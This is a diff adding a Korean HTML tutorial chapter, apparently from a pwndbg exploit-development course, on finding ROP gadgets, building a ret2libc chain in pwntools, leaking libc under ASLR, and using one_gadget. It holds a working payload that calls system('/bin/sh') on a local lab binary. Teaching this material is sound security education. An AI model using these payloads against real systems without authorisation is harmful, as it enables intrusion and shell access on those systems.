@@ -1,0 +1,191 @@
+<div class="page-header">
+  <div class="chapter-label">Chapter 07 · Part 3 — 익스플로잇 개발</div>
+  <h2>ROP 가젯 탐색</h2>
+  <p class="subtitle">NX가 있어도 실행할 수 있다 — 이미 있는 코드 조각을 이어붙인다</p>
+</div>
+
+<div class="callout info">
+  <span class="callout-icon">📌</span>
+  <div class="callout-body">
+    <strong>이 챕터에서 배울 것</strong>
+    <p>ROP 원리, pwndbg의 ropgadget/ropper 명령어, 런타임 메모리에서 가젯 탐색, ret2libc 체인 구성, one_gadget 연동, gadget 검색 팁.</p>
+  </div>
+</div>
+
+<h3>ROP란 — NX를 우회하는 원리</h3>
+
+<p>
+  NX(Non-eXecutable) 비트가 켜지면 스택이나 힙에 셸코드를 올려도 실행이 안 된다. 그러나 이미 바이너리와 libc 안에 있는 코드(실행 권한이 있는 영역)는 실행할 수 있다.
+</p>
+
+<p>
+  ROP(Return Oriented Programming)는 <strong>ret 명령어로 끝나는 작은 코드 조각(가젯)</strong>을 이어붙여서 원하는 동작을 만든다. 스택에 가젯 주소들을 순서대로 쌓아두면, 각 가젯이 <code>ret</code>으로 다음 가젯 주소를 꺼내 이어서 실행한다.
+</p>
+
+<pre><code><span class="cm">; ROP 체인 작동 원리</span>
+<span class="cm">; 스택 (낮은 주소 →):</span>
+<span class="cm">; [리턴 주소]       = gadget1 주소  (pop rdi; ret)</span>
+<span class="cm">; [gadget1 다음]    = "/bin/sh" 주소  ← pop rdi가 여기서 읽음</span>
+<span class="cm">; [그 다음]         = gadget2 주소  (ret)  ← 스택 정렬용</span>
+<span class="cm">; [그 다음]         = system() 주소  ← 최종 호출</span>
+
+<span class="cm">; 실행 흐름:</span>
+<span class="cm">; 1. pop rdi → RDI = "/bin/sh"</span>
+<span class="cm">; 2. ret → system() 호출</span>
+<span class="cm">; → system("/bin/sh") 실행!</span></code></pre>
+
+<h3>ropgadget — 런타임 가젯 탐색</h3>
+
+<pre><code><span class="cm"># 로드된 모든 영역에서 가젯 탐색 (실행 중에만 가능)</span>
+pwndbg> ropgadget
+
+<span class="cm"># 특정 패턴 필터</span>
+pwndbg> ropgadget --filter "pop rdi"
+pwndbg> ropgadget --filter "pop rsi"
+pwndbg> ropgadget --filter "pop rdx"
+pwndbg> ropgadget --filter "syscall"
+pwndbg> ropgadget --filter "ret"      <span class="cm"># ret 가젯 (스택 정렬용)</span>
+
+<span class="cm"># libc 영역에서만 탐색</span>
+pwndbg> ropgadget --range 0x7ffff7a00000-0x7ffff7dc9000
+
+<span class="cm"># 출력 예시</span>
+<span class="cm"># 0x000000000040119e : pop rdi ; ret</span>
+<span class="cm"># 0x00000000004011a0 : pop rsi ; pop r15 ; ret</span></code></pre>
+
+<h3>ropper — 더 강력한 가젯 탐색</h3>
+
+<pre><code><span class="cm"># ropper는 pwndbg와 통합된 외부 도구</span>
+pwndbg> ropper -- --search "pop rdi"
+pwndbg> ropper -- --search "pop rdi; ret"
+pwndbg> ropper -- --type rop          <span class="cm"># ROP 가젯 전체</span>
+pwndbg> ropper -- --type jop          <span class="cm"># JOP 가젯</span>
+
+<span class="cm"># 파일 직접 지정 (실행 전에도 가능)</span>
+<span class="cm"># (터미널에서)</span>
+ropper -f ./vuln --search "pop rdi"
+ropper -f /lib/x86_64-linux-gnu/libc.so.6 --search "pop rdi"</code></pre>
+
+<h3>ret2libc 체인 구성 — 실전 예시</h3>
+
+<p>
+  가장 기본적인 ROP 패턴: <code>system("/bin/sh")</code> 호출. libc의 <code>system()</code>과 <code>"/bin/sh"</code> 문자열을 활용한다.
+</p>
+
+<ul class="step-list">
+  <li>
+    <div class="step-num">1</div>
+    <div>
+      <strong>필요한 주소 수집</strong>
+      <pre><code><span class="cm"># libc 베이스 주소 (ASLR 없는 경우)</span>
+pwndbg> vmmap libc
+<span class="cm"># 0x7ffff7a00000 = libc base</span>
+
+<span class="cm"># system() 주소</span>
+pwndbg> p system
+<span class="cm"># $1 = {int (const char *)} 0x7ffff7a52290 &lt;system&gt;</span>
+
+<span class="cm"># "/bin/sh" 문자열 주소</span>
+pwndbg> search "/bin/sh"
+<span class="cm"># 0x7ffff7b97e9a — "/bin/sh"</span>
+
+<span class="cm"># pop rdi ; ret 가젯</span>
+pwndbg> ropgadget --filter "pop rdi"
+<span class="cm"># 0x40119e : pop rdi ; ret</span>
+
+<span class="cm"># ret 가젯 (스택 정렬 — 16바이트 정렬 필요 시)</span>
+pwndbg> ropgadget --filter "^ ret$"
+<span class="cm"># 0x40101a : ret</span></code></pre>
+    </div>
+  </li>
+  <li>
+    <div class="step-num">2</div>
+    <div>
+      <strong>체인 구성 (pwntools로)</strong>
+      <pre><code><span class="kw">from</span> pwn <span class="kw">import</span> *
+
+OFFSET      = <span class="num">72</span>           <span class="cm"># cyclic으로 찾은 오프셋</span>
+POP_RDI     = <span class="hex">0x40119e</span>     <span class="cm"># pop rdi ; ret</span>
+RET         = <span class="hex">0x40101a</span>     <span class="cm"># ret (스택 정렬)</span>
+BIN_SH      = <span class="hex">0x7ffff7b97e9a</span>
+SYSTEM      = <span class="hex">0x7ffff7a52290</span>
+
+payload  = <span class="fn">flat</span>(
+    <span class="str">b"A"</span> * OFFSET,
+    RET,          <span class="cm"># 스택 16바이트 정렬</span>
+    POP_RDI,      <span class="cm"># pop rdi ; ret</span>
+    BIN_SH,       <span class="cm"># → RDI = "/bin/sh"</span>
+    SYSTEM,       <span class="cm"># → call system("/bin/sh")</span>
+)</code></pre>
+    </div>
+  </li>
+  <li>
+    <div class="step-num">3</div>
+    <div>
+      <strong>pwndbg에서 체인 검증</strong>
+      <pre><code><span class="cm"># pop rdi 가젯에 BP</span>
+pwndbg> break *0x40119e
+pwndbg> run &lt; payload.bin
+
+<span class="cm"># BP 히트 후 스택 확인</span>
+pwndbg> telescope $rsp 4
+<span class="cm"># 00:0000│ rsp 0x7fff... —▸ 0x7ffff7b97e9a ("/bin/sh")</span>
+<span class="cm"># 01:0008│     0x7fff... —▸ 0x7ffff7a52290 (system)</span></code></pre>
+    </div>
+  </li>
+</ul>
+
+<h3>ASLR 환경에서의 ROP — libc 릭 필요</h3>
+
+<pre><code><span class="cm"># ASLR 환경: libc 주소가 매번 달라짐</span>
+<span class="cm"># 해결책: libc 주소를 런타임에 "릭"해서 base 계산</span>
+
+<span class="cm"># 패턴: puts(got_entry) → libc 주소 출력 → 오프셋으로 base 계산</span>
+
+<span class="cm"># 1. GOT의 puts 주소 확인</span>
+pwndbg> got              <span class="cm"># GOT 테이블 전체</span>
+<span class="cm"># puts@got = 0x404018</span>
+
+<span class="cm"># 2. PLT의 puts 주소</span>
+pwndbg> plt              <span class="cm"># PLT 테이블</span>
+<span class="cm"># puts@plt = 0x401070</span>
+
+<span class="cm"># 3. 릭 체인: pop rdi → got_puts → puts@plt → (다시 main)</span>
+<span class="cm"># 출력된 값 = libc 내 puts() 실제 주소</span>
+<span class="cm"># libc_base = 출력값 - puts_offset_in_libc</span>
+
+<span class="cm"># puts offset 확인</span>
+pwndbg> p &amp;puts - (long)0x7ffff7a00000   <span class="cm"># libc base로부터 거리</span>
+<span class="cm"># 또는 objdump로: readelf -s libc.so.6 | grep puts</span></code></pre>
+
+<h3>one_gadget — 가젯 하나로 셸 얻기</h3>
+
+<pre><code><span class="cm"># one_gadget: 조건이 맞으면 execve("/bin/sh") 하나로 셸 실행</span>
+<span class="cm"># (터미널에서)</span>
+one_gadget /lib/x86_64-linux-gnu/libc.so.6
+
+<span class="cm"># 출력 예시:</span>
+<span class="cm"># 0xe3afe execve("/bin/sh", r15, r12)</span>
+<span class="cm"># constraints:</span>
+<span class="cm">#   [r15] == NULL || r15 == NULL</span>
+<span class="cm">#   [r12] == NULL || r12 == NULL</span>
+<span class="cm">#</span>
+<span class="cm"># 0xe3b01 execve("/bin/sh", r15, rdx)</span>
+<span class="cm"># constraints:</span>
+<span class="cm">#   [r15] == NULL || r15 == NULL</span>
+<span class="cm">#   [rdx] == NULL || rdx == NULL</span>
+
+<span class="cm"># pwndbg에서 제약 조건 확인</span>
+pwndbg> p $r15           <span class="cm"># 제약 조건 레지스터 값 확인</span>
+pwndbg> p $r12
+<span class="cm"># 조건이 맞으면: libc_base + 0xe3afe 로 점프만 하면 셸!</span></code></pre>
+
+<div class="callout tip">
+  <span class="callout-icon">💡</span>
+  <div class="callout-body">
+    <strong>스택 정렬 문제 — movaps SIGSEGV</strong>
+    <p>
+      Ubuntu 18.04+ / glibc 2.29+에서 <code>system()</code> 내부의 <code>movaps</code> 명령어가 스택이 16바이트 정렬되지 않으면 SIGSEGV를 낸다. 이때 체인 앞에 <code>ret</code> 가젯 하나를 추가하면 해결된다. <code>ret</code>은 RSP를 8 증가시켜 정렬을 맞춘다.
+    </p>
+  </div>
+</div>
